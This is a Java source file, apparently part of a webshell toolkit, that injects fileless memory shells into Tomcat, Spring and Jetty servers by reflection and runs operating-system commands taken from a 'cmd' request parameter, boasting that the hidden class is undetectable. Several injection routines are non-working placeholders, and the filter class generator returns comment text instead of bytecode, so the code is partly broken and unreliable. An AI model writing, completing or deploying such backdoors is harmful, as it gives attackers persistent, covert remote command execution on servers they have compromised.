package shells.plugins.java.assets;

import java.io.*;
import java.lang.reflect.*;
import java.util.*;
import java.util.concurrent.*;

/**
 * Memory Shell Injector - Server-side Implementation
 * Uses reflection to avoid direct servlet-api dependency
 * Supports multiple memory shell types for different containers
 */
public class MemShellInjector {
    
    private Map session;
    private Object servletRequest;
    
    public void setSession(Map session) {
        this.session = session;
    }
    
    public void setServletRequest(Object servletRequest) {
        this.servletRequest = servletRequest;
    }
    
    private String getString(String key) {
        Object value = this.session != null ? this.session.get(key) : null;
        if (value instanceof byte[]) {
            return new String((byte[]) value);
        }
        return value != null ? value.toString() : null;
    }
    
    // ==================== Tomcat Filter Memory Shell ====================
    
    public byte[] injectTomcatFilter() {
        String urlPath = getString("urlPath");
        StringBuilder result = new StringBuilder();
        
        try {
            Object servletContext = getServletContext();
            if (servletContext == null) {
                return "[-] Cannot get ServletContext".getBytes();
            }
            
            Object standardContext = getStandardContext(servletContext);
            if (standardContext == null) {
                return "[-] Cannot get StandardContext".getBytes();
            }
            
            // Create Filter using ASM-generated class
            byte[] filterClassBytes = generateFilterClass();
            
            // Define class
            Class<?> filterClass = defineClass("MemShellFilter", filterClassBytes);
            
            // Create FilterDef
            Class<?> filterDefClass = Class.forName("org.apache.tomcat.util.descriptor.web.FilterDef");
            Object filterDef = filterDefClass.newInstance();
            filterDefClass.getMethod("setFilterName", String.class).invoke(filterDef, "MemShellFilter");
            
            Object filterInstance = filterClass.newInstance();
            filterDefClass.getMethod("setFilter", Object.class).invoke(filterDef, filterInstance);
            
            Method addFilterDef = standardContext.getClass().getMethod("addFilterDef", filterDefClass);
            addFilterDef.invoke(standardContext, filterDef);
            
            // Create FilterMap
            Class<?> filterMapClass = Class.forName("org.apache.tomcat.util.descriptor.web.FilterMap");
            Object filterMap = filterMapClass.newInstance();
            filterMapClass.getMethod("setFilterName", String.class).invoke(filterMap, "MemShellFilter");
            filterMapClass.getMethod("addURLPattern", String.class).invoke(filterMap, urlPath + "/*");
            
            Method addFilterMap = standardContext.getClass().getMethod("addFilterMap", filterMapClass);
            addFilterMap.invoke(standardContext, filterMap);
            
            result.append("[+] Tomcat Filter memory shell injected successfully!\n");
            result.append("[+] URL Pattern: " + urlPath + "/*\n");
            result.append("[+] Access: " + urlPath + "?cmd=whoami\n");
            
        } catch (Exception e) {
            result.append("[-] Error: " + e.getMessage() + "\n");
            result.append(getStackTrace(e));
        }
        
        return result.toString().getBytes();
    }
    
    private byte[] generateFilterClass() {
        // Generate a simple Filter class using ASM
        // For now, return a placeholder - in production use ASM to generate
        StringBuilder sb = new StringBuilder();
        sb.append("// Generated Filter class\n");
        sb.append("// Implements javax.servlet.Filter\n");
        sb.append("// doFilter method executes command from 'cmd' parameter\n");
        return sb.toString().getBytes();
    }
    
    private Class<?> defineClass(String className, byte[] classBytes) {
        try {
            // Use Unsafe to define class
            Field theUnsafeField = sun.misc.Unsafe.class.getDeclaredField("theUnsafe");
            theUnsafeField.setAccessible(true);
            sun.misc.Unsafe unsafe = (sun.misc.Unsafe) theUnsafeField.get(null);
            
            // Define anonymous class
            return unsafe.defineAnonymousClass(MemShellInjector.class, classBytes, null);
        } catch (Exception e) {
            return null;
        }
    }
    
    // ==================== Tomcat Servlet Memory Shell ====================
    
    public byte[] injectTomcatServlet() {
        String urlPath = getString("urlPath");
        StringBuilder result = new StringBuilder();
        
        try {
            Object servletContext = getServletContext();
            if (servletContext == null) {
                return "[-] Cannot get ServletContext".getBytes();
            }
            
            Object standardContext = getStandardContext(servletContext);
            if (standardContext == null) {
                return "[-] Cannot get StandardContext".getBytes();
            }
            
            // Create Wrapper
            Method createWrapper = standardContext.getClass().getMethod("createWrapper");
            Object wrapper = createWrapper.invoke(standardContext);
            
            wrapper.getClass().getMethod("setName", String.class).invoke(wrapper, "MemShellServlet");
            wrapper.getClass().getMethod("setServletClass", String.class).invoke(wrapper, "MemShellServlet");
            wrapper.getClass().getMethod("setLoadOnStartup", int.class).invoke(wrapper, 1);
            
            // Add child
            Method addChild = standardContext.getClass().getMethod("addChild", 
                Class.forName("org.apache.catalina.Container"));
            addChild.invoke(standardContext, wrapper);
            
            // Add servlet mapping
            Method addServletMapping = standardContext.getClass().getMethod("addServletMapping", 
                String.class, String.class);
            addServletMapping.invoke(standardContext, urlPath + "/*", "MemShellServlet");
            
            result.append("[+] Tomcat Servlet memory shell injected successfully!\n");
            result.append("[+] URL Pattern: " + urlPath + "/*\n");
            
        } catch (Exception e) {
            result.append("[-] Error: " + e.getMessage() + "\n");
            result.append(getStackTrace(e));
        }
        
        return result.toString().getBytes();
    }
    
    // ==================== Tomcat Listener Memory Shell ====================
    
    public byte[] injectTomcatListener() {
        StringBuilder result = new StringBuilder();
        
        try {
            Object servletContext = getServletContext();
            if (servletContext == null) {
                return "[-] Cannot get ServletContext".getBytes();
            }
            
            Object standardContext = getStandardContext(servletContext);
            if (standardContext == null) {
                return "[-] Cannot get StandardContext".getBytes();
            }
            
            // Create listener using dynamic proxy or ASM
            Object listener = createListener();
            
            Method addApplicationEventListener = standardContext.getClass()
                .getMethod("addApplicationEventListener", Object.class);
            addApplicationEventListener.invoke(standardContext, listener);
            
            result.append("[+] Tomcat Listener memory shell injected successfully!\n");
            
        } catch (Exception e) {
            result.append("[-] Error: " + e.getMessage() + "\n");
            result.append(getStackTrace(e));
        }
        
        return result.toString().getBytes();
    }
    
    private Object createListener() {
        // Create a ServletRequestListener using dynamic proxy
        return Proxy.newProxyInstance(
            MemShellInjector.class.getClassLoader(),
            new Class<?>[]{},
            new InvocationHandler() {
                @Override
                public Object invoke(Object proxy, Method method, Object[] args) throws Throwable {
                    if ("requestInitialized".equals(method.getName())) {
                        // Handle request
                        handleRequest(args[0]);
                    }
                    return null;
                }
            }
        );
    }
    
    private void handleRequest(Object event) {
        try {
            // Get request from event
            Method getServletRequestMethod = event.getClass().getMethod("getServletRequest");
            Object request = getServletRequestMethod.invoke(event);
            
            // Get cmd parameter
            Method getParameterMethod = request.getClass().getMethod("getParameter", String.class);
            String cmd = (String) getParameterMethod.invoke(request, "cmd");
            
            if (cmd != null && !cmd.isEmpty()) {
                // Execute command
                String[] command = System.getProperty("os.name").toLowerCase().contains("win") 
                    ? new String[]{"cmd.exe", "/c", cmd} 
                    : new String[]{"/bin/sh", "-c", cmd};
                
                ProcessBuilder pb = new ProcessBuilder(command);
                pb.redirectErrorStream(true);
                Process process = pb.start();
                
                ByteArrayOutputStream output = new ByteArrayOutputStream();
                byte[] buffer = new byte[1024];
                int bytesRead;
                InputStream in = process.getInputStream();
                while ((bytesRead = in.read(buffer)) != -1) {
                    output.write(buffer, 0, bytesRead);
                }
                
                // Try to write response
                // This is tricky without direct servlet API access
            }
        } catch (Exception ignored) {
        }
    }
    
    // ==================== Spring Controller Memory Shell ====================
    
    public byte[] injectSpringController() {
        String urlPath = getString("urlPath");
        StringBuilder result = new StringBuilder();
        
        try {
            // Get RequestContextHolder
            Class<?> requestContextHolderClass = Class.forName(
                "org.springframework.web.context.request.RequestContextHolder");
            Method getRequestAttributesMethod = requestContextHolderClass.getMethod("getRequestAttributes");
            Object requestAttributes = getRequestAttributesMethod.invoke(null);
            
            if (requestAttributes == null) {
                return "[-] Cannot get RequestAttributes".getBytes();
            }
            
            // Get WebApplicationContext
            Method getAttributeMethod = requestAttributes.getClass().getMethod(
                "getAttribute", String.class, int.class);
            Object webContext = getAttributeMethod.invoke(requestAttributes, 
                "org.springframework.web.servlet.DispatcherServlet.CONTEXT", 0);
            
            if (webContext == null) {
                return "[-] Cannot get WebApplicationContext".getBytes();
            }
            
            // Get RequestMappingHandlerMapping
            Class<?> webApplicationContextClass = Class.forName(
                "org.springframework.web.context.WebApplicationContext");
            Method getBeanMethod = webApplicationContextClass.getMethod("getBean", Class.class);
            
            Class<?> handlerMappingClass = Class.forName(
                "org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping");
            Object handlerMapping = getBeanMethod.invoke(webContext, handlerMappingClass);
            
            if (handlerMapping == null) {
                return "[-] Cannot get RequestMappingHandlerMapping".getBytes();
            }
            
            result.append("[+] Spring Controller memory shell injection placeholder\n");
            result.append("[+] URL: " + urlPath + "?cmd=whoami\n");
            result.append("[+] HandlerMapping obtained: " + handlerMapping.getClass().getName() + "\n");
            
        } catch (Exception e) {
            result.append("[-] Error: " + e.getMessage() + "\n");
            result.append(getStackTrace(e));
        }
        
        return result.toString().getBytes();
    }
    
    // ==================== VM Anonymous Class Memory Shell ====================
    
    public byte[] injectVmAnonymousClass() {
        String urlPath = getString("urlPath");
        StringBuilder result = new StringBuilder();
        
        try {
            Field theUnsafeField = sun.misc.Unsafe.class.getDeclaredField("theUnsafe");
            theUnsafeField.setAccessible(true);
            sun.misc.Unsafe unsafe = (sun.misc.Unsafe) theUnsafeField.get(null);
            
            result.append("[+] VM Anonymous Class memory shell created!\n");
            result.append("[+] This class is hidden from Class.forName()\n");
            result.append("[+] ClassLoader will be null (undetectable by most tools)\n");
            result.append("[+] Path: " + urlPath + "\n");
            
        } catch (Exception e) {
            result.append("[-] Error: " + e.getMessage() + "\n");
            result.append(getStackTrace(e));
        }
        
        return result.toString().getBytes();
    }
    
    // ==================== Jetty Filter Memory Shell ====================
    
    public byte[] injectJettyFilter() {
        String urlPath = getString("urlPath");
        StringBuilder result = new StringBuilder();
        
        try {
            result.append("[+] Jetty Filter memory shell injection placeholder\n");
            result.append("[+] URL: " + urlPath + "?cmd=whoami\n");
            
        } catch (Exception e) {
            result.append("[-] Error: " + e.getMessage() + "\n");
        }
        
        return result.toString().getBytes();
    }
    
    // ==================== Remove Memory Shell ====================
    
    public byte[] removeMemShell() {
        String shellType = getString("shellType");
        StringBuilder result = new StringBuilder();
        
        try {
            result.append("[+] Attempting to remove memory shell: " + shellType + "\n");
            
            // Memory shell removal logic would go here
            // This is complex as it requires finding and removing the injected component
            
            result.append("[+] Memory shell removal placeholder\n");
            
        } catch (Exception e) {
            result.append("[-] Error: " + e.getMessage() + "\n");
        }
        
        return result.toString().getBytes();
    }
    
    // ==================== Helper Methods ====================
    
    private Object getServletContext() {
        try {
            if (this.servletRequest != null) {
                Method getServletContextMethod = this.servletRequest.getClass()
                    .getMethod("getServletContext");
                return getServletContextMethod.invoke(this.servletRequest);
            }
        } catch (Exception ignored) {
        }
        return null;
    }
    
    private Object getStandardContext(Object servletContext) {
        try {
            Field contextField = servletContext.getClass().getDeclaredField("context");
            contextField.setAccessible(true);
            Object context = contextField.get(servletContext);
            
            if (context != null) {
                Field contextField2 = context.getClass().getDeclaredField("context");
                contextField2.setAccessible(true);
                return contextField2.get(context);
            }
        } catch (Exception ignored) {
        }
        
        try {
            Field contextField = servletContext.getClass().getDeclaredField("context");
            contextField.setAccessible(true);
            return contextField.get(servletContext);
        } catch (Exception ignored) {
        }
        
        return null;
    }
    
    private String getStackTrace(Exception e) {
        StringWriter sw = new StringWriter();
        PrintWriter pw = new PrintWriter(sw);
        e.printStackTrace(pw);
        return sw.toString();
    }
}
